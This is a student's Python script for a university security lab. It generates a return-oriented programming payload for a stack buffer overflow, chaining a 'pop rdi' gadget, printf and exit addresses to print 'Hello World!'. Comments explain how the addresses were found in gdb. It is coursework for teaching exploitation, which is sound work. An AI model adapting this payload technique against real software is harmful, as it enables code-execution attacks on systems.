#!/usr/bin/env python
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
# Dabin len
# 1000727

from struct import *

lennops = 80 # or some other value
lenfill = 72 # or some other value

# The String address for inside gdb and outsdie gdb are different because of the environemnet variables.
# I figured out the string address for INSIDE GDB first and then proceeded to figure out the string address for OUTSIDE GDB.
# For the gadget, I used the 'ropsearch "pop rdi" libc' and used the first address
# For the address for printf function, I used 'p printf' to figure out the address for the printf function
# For the address for the exit function, I used 'p exit' to figure out the address
# For the strings address, I used the searchmem command to search its address
# Following the diagram from the instructions of lab5, I generated the payload
# You can choose to either go for inside gdb addresses or outside gdb addresses

# for inside gdb
address = pack("<Q", 0x7fffffffde78) 
gadget = pack("<Q", 0x00007ffff7ad4000) 
string = pack("<Q", 0x7fffffffeade) 
printf = pack("<Q", 0x7ffff7a69400) 
exit = pack("<Q", 0x7ffff7a51290)
strings = "Hello World!"
  
# OUTSIDE GDB    
# address = pack("<Q", 0x7fffffffde78) 
# gadget = pack("<Q", 0x00007ffff7ad4000) 
# string = pack("<Q", 0x7fffffffeaff) 
# printf = pack("<Q", 0x7ffff7a69400) 
# exit = pack("<Q", 0x7ffff7a51290)
# strings = "Hello World!"

payl = "A"*lenfill

# address = "DDDDDDDD" 
nops = "\x90" * lennops 

with open('payload','w') as f:
    f.write(payl+gadget+string+printf+exit+strings)
